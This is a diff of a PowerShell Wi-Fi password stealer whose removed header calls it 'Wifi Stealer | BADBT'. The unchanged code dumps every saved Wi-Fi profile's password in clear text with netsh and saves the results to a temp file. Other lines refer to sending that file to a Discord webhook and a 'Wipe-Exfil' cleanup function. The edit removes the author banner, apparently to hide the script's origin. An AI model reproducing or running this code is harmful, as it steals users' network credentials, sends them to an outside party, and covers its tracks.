@@ -1,12 +1,7 @@
-#===============================================
-# Code Name : Wifi Stealer | BADBT
-# Author 	: netwrkspider
-# website  	: www.netwrkspider.org
-#===============================================
-
 #Capture wifi password 
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+
 $wifiProfiles > $env:TEMP/wifi-sec.txt
 
 
@@ -39,7 +34,7 @@ if (-not ([string]::IsNullOrEmpty($dcwebhook))){Xfer-Discord -file "$env:TEMP/wi
 
  
 
-#=========================================
+#############################################
 
 function Wipe-Exfil { 
 
